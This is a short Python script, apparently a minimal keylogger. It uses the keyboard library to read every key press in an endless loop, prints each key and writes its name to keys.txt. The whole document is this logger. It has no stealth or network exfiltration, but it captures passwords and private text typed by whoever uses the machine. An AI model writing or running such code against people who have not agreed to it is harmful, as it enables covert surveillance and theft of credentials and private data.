import keyboard

f = open("keys.txt", "w")

while True:
    rk = keyboard.read_event()
    if rk.event_type == "down":
        print("Logged: ", rk.name)
        f.write(rk.name)
    

